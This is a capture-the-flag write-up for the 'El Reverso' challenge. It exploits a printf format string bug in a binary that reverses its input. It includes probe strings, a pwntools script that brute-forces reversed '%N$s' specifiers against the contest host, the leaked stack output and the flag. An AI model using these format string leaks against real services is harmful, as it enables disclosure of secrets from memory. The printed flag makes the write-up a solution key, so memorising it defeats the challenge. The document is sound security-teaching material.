# El Reverso  
**Author:** marv1nh  
**Solves:** 12  

## Overview

We are given a binary file called `translate`, running on a remote server listening on port 1337. The challenge is to exploit this binary and retrieve a flag in the format `DDC{...}`.

---

## Analysis

### Step 1: Initial Recon

I opened the binary in GDB and set a breakpoint at `main()`. I wanted to check for common vulnerabilities, so I tested for format string bugs using the following inputs:

```
%p%p%p%p%n  
%p%p%p%p%p%pAAAA
```

Both inputs were accepted and returned values, indicating the program is vulnerable to **format string attacks**.

---

### Step 2: Understanding the Reversal

Further inspection revealed that the binary was using something equivalent to:

```c
printf(strrev(user_input));
```

This meant that if I provided a format string like `%8$s`, it would be reversed before being passed to `printf`, resulting in `s$8%`, which still gets interpreted correctly. Therefore, the binary still leaks stack content — just in reverse.

---

### Step 3: Flag Location

From the provided Dockerfile:

```dockerfile
CMD socat tcp-l:1337,reuseaddr,fork exec:"./translate DDC{flag_eksempel_flag_eksempel__}",pty,echo=0,raw
```

This shows the flag is passed **as a command-line argument**, and therefore exists somewhere on the stack during program execution.

---

## Exploitation

To find which argument contained the flag, I wrote a script to brute-force and print the **Nth string argument** (in reverse), by sending inputs like `s$1%`, `s$2%`, ..., `s$20%`.

---

### Solve Script

```python
from pwn import *

context.log_level = 'error'

host = 'translate.hkn'
port = 1337

for i in range(1, 21):  # try up to 20 args
    io = remote(host, port)

    # Sync with the prompt
    io.recvuntil(b'> ')
    
    # Send the reversed format string: s$<i>%
    fmt = f's${i}%'
    io.sendline(fmt.encode())
    
    try:
        result = io.recvline(timeout=2).strip()
        if result:
            print(f"[{i}] {result.decode(errors='ignore')}")
    except Exception:
        print(f"[{i}] (timeout or no response)")
    
    io.close()
```

---

### Running the Script

Reversing the output with `rev` reveals the flag clearly:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 flag.py | rev
)esnopser on ro tuoemit( ]1[
s$ ]2[
)esnopser on ro tuoemit( ]3[
c ]4[
" ]5[
 ]6[
)esnopser on ro tuoemit( ]7[
DDC{1_4M_EL_REVER20_1_4M_THE_8E2T} ]8[
DDC{1_4M_EL_REVER20_1_4M_THE_8E2T} ]9[
)esnopser on ro tuoemit( ]01[
)llun( ]11[
)llun( ]21[
)llun( ]31[
)llun( ]41[
)esnopser on ro tuoemit( ]51[
)llun( ]61[
LTPHH^I1 ]71[
)llun( ]81[
4.3.24.01=RDDAREEP_TACOS ]91[
s$ ]02[

...
```

Flag

```
DDC{1_4M_EL_REVER20_1_4M_THE_8E2T}
```

---

## Conclusion

By identifying and exploiting a format string vulnerability in a binary that reverses user input, I was able to leak the flag passed as a command-line argument. Brute-forcing `n` in `%n$s` format specifiers allowed me to print and reverse the flag successfully.

**Final Flag:**  
`DDC{1_4M_EL_REVER20_1_4M_THE_8E2T}`